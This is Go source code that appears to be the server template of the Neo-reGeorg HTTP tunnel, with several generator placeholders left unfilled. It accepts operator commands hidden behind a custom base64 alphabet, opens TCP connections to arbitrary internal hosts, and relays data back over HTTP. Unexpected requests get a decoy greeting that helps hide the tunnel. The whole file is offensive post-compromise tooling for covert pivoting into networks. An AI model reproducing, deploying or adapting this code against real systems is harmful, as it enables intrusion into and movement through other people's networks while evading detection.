package main

import (
    "bytes"
    "encoding/base64"
    "encoding/binary"
    "fmt"
    "io/ioutil"
    "math/rand"
    "net"
    "net/http"
    "os"
    "strings"
    "sync"
    "time"
)

var (
    DATA          = 1
    CMD           = 2
    MARK          = 3
    STATUS        = 4
    ERROR         = 5
    IP            = 6
    PORT          = 7
    REDIRECTURL   = 8
    FORCEREDIRECT = 9


    en     = []byte("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/")
    de     = []byte("BASE64 CHARSLIST")
    en_map = make(map[byte]byte)
    de_map = make(map[byte]byte)

    neoreg_hello = []byte("NeoGeorg says, 'All seems fine'")

    sessions = make(map[string]*session)

    lock sync.Mutex
)

func zip(tomap map[byte]byte, a []byte, b []byte) {
    size := len(a)
    for i := 0; i < size; i++ {
        tomap[a[i]] = b[i]
    }
}

func base64decode(data []byte) ([]byte, error) {
    size := len(data)
    out := make([]byte, size)
    for i := 0; i < size; i++ {
        n := de_map[data[i]]
        if n == 0 {
            out[i] = data[i]
        } else {
            out[i] = n
        }
    }
    return base64.StdEncoding.DecodeString(string(out))
}

func base64encode(rawdata []byte) []byte {
    data := []byte(base64.StdEncoding.EncodeToString(rawdata))
    size := len(data)
    out := make([]byte, size)
    for i := 0; i < size; i++ {
        n := en_map[data[i]]
        if n == 0 {
            out[i] = data[i]
        } else {
            out[i] = n
        }
    }
    return out
}

func blv_decode(data []byte) map[int][]byte {
    info := make(map[int][]byte)
    in := bytes.NewReader(data)
    var b_byte byte
    var l_int32 int32

    for true {
        err := binary.Read(in, binary.BigEndian, &b_byte)
        if err != nil {
            break
        }
        binary.Read(in, binary.BigEndian, &l_int32)
        b := int(b_byte)
        l := int(l_int32) - BLV_L_OFFSET

        v := make([]byte, l)
        in.Read(v)
        info[b] = v
    }
    return info
}

func randbyte() []byte {
    min := 5
    max := 20
    length := rand.Intn(max-min-1) + 1
    data := make([]byte, length)
    rand.Read(data)
    return data
}

func blv_encode(info map[int][]byte) []byte {
    info[0] = randbyte()
    info[39] = randbyte()

    data := bytes.NewBuffer([]byte{})
    for b, v := range info {
        l := len(v)
        binary.Write(data, binary.BigEndian, byte(b))
        binary.Write(data, binary.BigEndian, int32(l) + BLV_L_OFFSET)
        binary.Write(data, binary.BigEndian, v)
    }
    return data.Bytes()
}

func newSession(conn net.Conn) *session {
    sess := &session{
        conn:  conn,
        buf:   new(bytes.Buffer),
        input: make(chan []byte, 100),
    }

    go func() {
        for {
            buf := make([]byte, READBUF)
            n, err := sess.conn.Read(buf)
            if err != nil {
                return
            }

            for sess.buf.Len() > MAXREADSIZE {
               time.Sleep(10*time.Millisecond)
            }

            sess.buf.Write(buf[:n])
        }
        sess.Close()
    }()

    go func() {
        for !sess.closed {
            _, err := sess.conn.Write(<-sess.input)
            if err != nil {
                return
            }
        }
        sess.Close()
    }()
    return sess
}

type session struct {
    conn   net.Conn
    buf    *bytes.Buffer
    input  chan []byte
    closed bool
}

func (sess *session) Write(buf []byte) error {
    if sess.closed {
        return fmt.Errorf("conn closed")
    }
    sess.input <- buf
    return nil
}

func (sess *session) Close() {
    sess.conn.Close()
    close(sess.input)
    sess.closed = true
}

func neoreg(w http.ResponseWriter, r *http.Request) {
    w.WriteHeader(HTTPCODE)

    defer r.Body.Close()
    data, _ := ioutil.ReadAll(r.Body)

    if USE_REQUEST_TEMPLATE == 1 && len(data) > 0 {
        data = data[START_INDEX:]
        data = data[:len(data)-END_INDEX]
    }

    out, err := base64decode(data)
    if err == nil && len(out) != 0 {
        info := blv_decode(out)
        rinfo := make(map[int][]byte)

        cmd := string(info[CMD])
        mark := string(info[MARK])
        switch cmd {
        case "CONNECT":
            ip := string(info[IP])
            port_str := string(info[PORT])
            targetAddr := ip + ":" + port_str
            conn, err := net.DialTimeout("tcp", targetAddr, time.Millisecond*3000)
            if err == nil {
                lock.Lock()
                sessions[mark] = newSession(conn)
                lock.Unlock()
                rinfo[STATUS] = []byte("OK")
            } else {
                rinfo[STATUS] = []byte("FAIL")
                rinfo[ERROR] = []byte(err.Error())
            }

        case "FORWARD":
            sess := sessions[mark]
            if sess != nil {
                data := info[DATA]
                err := sess.Write(data)
                if err == nil {
                    rinfo[STATUS] = []byte("OK")
                } else {
                    rinfo[STATUS] = []byte("FAIL")
                    rinfo[ERROR] = []byte(err.Error())
                }
            } else {
                rinfo[STATUS] = []byte("FAIL")
                rinfo[ERROR] = []byte("session is closed")
            }

        case "READ":
            sess := sessions[mark]
            if sess != nil {
                rinfo[STATUS] = []byte("OK")
                if sess.buf.Len() > 0 {
                    rinfo[DATA] = sess.buf.Bytes()
                    sess.buf.Reset()
                }
            } else {
                rinfo[STATUS] = []byte("FAIL")
                rinfo[ERROR] = []byte("session is closed")
            }

        case "DISCONNECT":
            sess := sessions[mark]
            if sess != nil {
                lock.Lock()
                delete(sessions, mark)
                lock.Unlock()
                sess.Close()
            }

        default:
            hello, _ := base64decode(neoreg_hello)
            fmt.Fprintf(w, "%s", hello)
            return
        }

        data := blv_encode(rinfo)
        fmt.Fprintf(w, "%s", base64encode(data))
    } else {
        hello, _ := base64decode(neoreg_hello)
        fmt.Fprintf(w, "%s", hello)
    }

}

func main() {
    if len(os.Args) != 2 {
        return
    }
    zip(en_map, en, de)
    zip(de_map, de, en)

    listen_addr := os.Args[1]
    if !strings.ContainsAny(listen_addr, ":") {
        listen_addr = ":" + listen_addr
    }
    http.HandleFunc("/", neoreg)
    http.ListenAndServe(listen_addr, nil)
}
